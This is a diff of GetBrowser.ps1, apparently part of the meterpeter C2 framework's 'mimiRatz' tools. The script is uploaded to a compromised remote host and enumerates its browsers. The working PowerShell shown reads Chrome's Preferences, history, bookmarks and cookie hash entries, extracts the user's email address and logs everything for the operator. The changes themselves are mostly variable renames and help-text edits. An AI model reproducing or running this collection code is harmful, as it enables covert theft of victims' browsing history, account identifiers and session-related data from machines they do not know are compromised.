@@ -33,19 +33,16 @@
    - Upload Local File: mimiRatz\GetBrowser.ps1
    :meterpeter> .\GetBrowser.ps1 -IE
    
-   Uploads This PS Script to Remote-Host $env:TMP (Client Working Dir) Using meterpeter
-   tool, and Enumerates Internet Explorer Remote browser through meterpeter C2 Server
+   Uploads This PS Script to Remote-Host $env:TMP Using meterpeter Server Script
+   and Enumerates Internet Explorer Remote browser through meterpeter C2 Server.
    
 .LINK 
     https://github.com/r00t-3xp10it/meterpeter
     https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/GetBrowser.ps1
 #>
 
+
 $IPATH = pwd
-$Path = $null
-$JsPrefs = $null
-$IEVersion = $null
-$IEHistory = $null
 $ParsingData = $null
 $param1 = $args[0] # User Inputs [Arguments]
 $param2 = $args[1] # User Inputs [Arguments]
@@ -120,8 +117,8 @@ function HELP_MENU {
     write-host "  - Upload Local File: mimiRatz\GetBrowser.ps1"
     write-host "  :meterpeter> .\GetBrowser.ps1 -IE"
     write-host "`n"
-    write-host "  Uploads This PS Script to Remote-Host `$env:TMP Location and Enumerates Internet Explorer"
-    write-host "  Remote browser using meterpeter C2 Server { https://github.com/r00t-3xp10it/meterpeter }"
+    write-host "  Uploads This PS Script to Remote-Host `$env:TMP Using meterpeter Server Script"
+    write-host "  and Enumerates Internet Explorer Remote browser through meterpeter C2 Server."
     write-host "`n"
     write-host ".LINK" -ForegroundColor Green
     write-host "  https://github.com/r00t-3xp10it/meterpeter"
@@ -263,55 +260,55 @@ function FIREFOX {
 
 function CHROME {
   ## Retrieve Google Chrome Browser Information
-  $ChromeApp = Get-ItemProperty 'HKCU:\Software\Google\Chrome\BLBeacon' -ErrorAction SilentlyContinue
-  If(-not($ChromeApp) -or $ChromeApp -eq $null){
+  $Chrome_App = Get-ItemProperty 'HKCU:\Software\Google\Chrome\BLBeacon' -ErrorAction SilentlyContinue
+  If(-not($Chrome_App) -or $Chrome_App -eq $null){
       echo "`n`n`nChrome Browser" >> $LogFilePath\BrowserEnum.log
       echo "--------------" >> $LogFilePath\BrowserEnum.log
       echo "Could not find any Browser Info .." >> $LogFilePath\BrowserEnum.log
   }else{
-      $Prefs_Path = get-content "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"
+      $Preferencies_Path = get-content "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"
       echo "`n`n`nChrome Browser" >> $LogFilePath\BrowserEnum.log
       echo "--------------" >> $LogFilePath\BrowserEnum.log
-      ## Retrieve Download Pref Settings
-      $Parse_String = $Prefs_Path.split(",")
-      $Dump_Download = $Parse_String|select-string "download"
-      $Dumped = $Dump_Download[1] # download_history Property
-      $Parse_Dump = $Dumped -replace '"','' -replace ':',' : '
-      echo "$Parse_Dump" >> $LogFilePath\BrowserEnum.log
+
+         ## Retrieve Download Pref Settings
+         $Parse_String = $Preferencies_Path.split(",")
+         $Search_Download = $Parse_String|select-string "download"
+         $Store_Dump = $Search_Download[1] # download_history Property
+         $Parse_Dump = $Store_Dump -replace '"','' -replace ':',' : '
+         echo "$Parse_Dump" >> $LogFilePath\BrowserEnum.log
 
          ## Retrieve Browser accept languages
-         $Parse_String = $Prefs_Path.split(",")
-         $Dump_Lang = $Parse_String|select-string "accept_languages"
-         $Dumped = $Dump_Lang -replace '"','' -replace 'intl:{','' -replace ':',' : '
-         echo "$Dumped" >> $LogFilePath\BrowserEnum.log
+         $Parse_String = $Preferencies_Path.split(",")
+         $Search_Lang = $Parse_String|select-string "accept_languages"
+         $Parse_Dump = $Search_Lang -replace '"','' -replace 'intl:{','' -replace ':',' : '
+         echo "$Parse_Dump" >> $LogFilePath\BrowserEnum.log
 
          ## Retrieve Browser Version
          $GCVersionInfo = (Get-ItemProperty 'HKCU:\Software\Google\Chrome\BLBeacon').Version
          echo "Version          : $GCVersionInfo" >> $LogFilePath\BrowserEnum.log
 
          ## Retrieve Email from Google CHROME preferencies File ..
-         $Parse_String = $Prefs_Path.split(",")
-         $Dump_Email = $Parse_String|select-string "email"
-         $Email = $Dump_Email -replace ' ','' -replace '"','' -replace ':','            : '
+         $Parse_String = $Preferencies_Path.split(",")
+         $Search_Email = $Parse_String|select-string "email"
+         $Parse_Dump = $Search_Email -replace ' ','' -replace '"','' -replace ':','            : '
 
-      If($Email){
-          echo "$Email" >> $LogFilePath\BrowserEnum.log
-      }else{
+      If(-not($Search_Email) -or $Search_Email -eq $null){
           echo "Email            : None Email Found .." >> $LogFilePath\BrowserEnum.log
+      }else{
+          echo "$Parse_Dump" >> $LogFilePath\BrowserEnum.log
       }
   }
 
   ## Retrieve Chrome History
   # Source: https://github.com/hematic/Helper-Functions/blob/8d5e7a8b41e87ce3f54dc06c40aa1ae5f90c1cfc/Get-BrowserData.ps1
-  $UserName = "$env:username"
-  echo "`nChrome History" >> $LogFilePath\BrowserEnum.log
-  echo "--------------" >> $LogFilePath\BrowserEnum.log
   $History_Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
   $check_path = Test-Path -Path $History_Path
   If($check_path -eq $True){
+      echo "`nChrome History" >> $LogFilePath\BrowserEnum.log
+      echo "--------------" >> $LogFilePath\BrowserEnum.log
       $Regex = '(htt(p|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
-      $GetValues = Get-Content -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"|Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
-      $GetValues | ForEach-Object {
+      $Get_Values = Get-Content -Path "$History_Path"|Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
+      $Get_Values | ForEach-Object {
           $Key = $_
           if ($Key -match $Search){
               echo "$_" >> $LogFilePath\BrowserEnum.log
@@ -324,12 +321,12 @@ function CHROME {
   }
 
   ## Retrieve Chrome bookmarks
-  $Book_Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Bookmarks"
-  $check_path = Test-Path -Path $Book_Path
+  $Bookmarks_Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Bookmarks"
+  $check_path = Test-Path -Path $Bookmarks_Path
   If($check_path -eq $True){
       echo "`nChrome Bookmarks" >> $LogFilePath\BrowserEnum.log
       echo "----------------" >> $LogFilePath\BrowserEnum.log
-      Get-Content $Book_Path|Select-String "http" >> $LogFilePath\BrowserEnum.log #|format-list
+      Get-Content $Bookmarks_Path|Select-String "http" >> $LogFilePath\BrowserEnum.log #|format-list
   }else{
       echo "`nChrome Bookmarks" >> $LogFilePath\BrowserEnum.log
       echo "----------------" >> $LogFilePath\BrowserEnum.log
@@ -342,10 +339,11 @@ function CHROME {
   If($check_path -eq $True){
       echo "`nChrome Cookies" >> $LogFilePath\BrowserEnum.log
       echo "--------------" >> $LogFilePath\BrowserEnum.log
-      $Parse_String = $Prefs_Path.split(",");$Find_MyHash = $Parse_String|Select-String "hash"
+      $Preferencies_Path = get-content "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"
+      $Parse_String = $Preferencies_Path.split(",");$Find_MyHash = $Parse_String|Select-String "hash"
       $BadChars = $Find_MyHash -replace '"setting":{"hasHighScore":false',''
-      $Dump = $BadChars|where-object {$_}
-      echo $Dump >> $LogFilePath\BrowserEnum.log
+      $Dump_Key_Hash = $BadChars|where-object {$_}
+      echo $Dump_Key_Hash >> $LogFilePath\BrowserEnum.log
   }else{
       echo "`nChrome Cookies" >> $LogFilePath\BrowserEnum.log
       echo "--------------" >> $LogFilePath\BrowserEnum.log
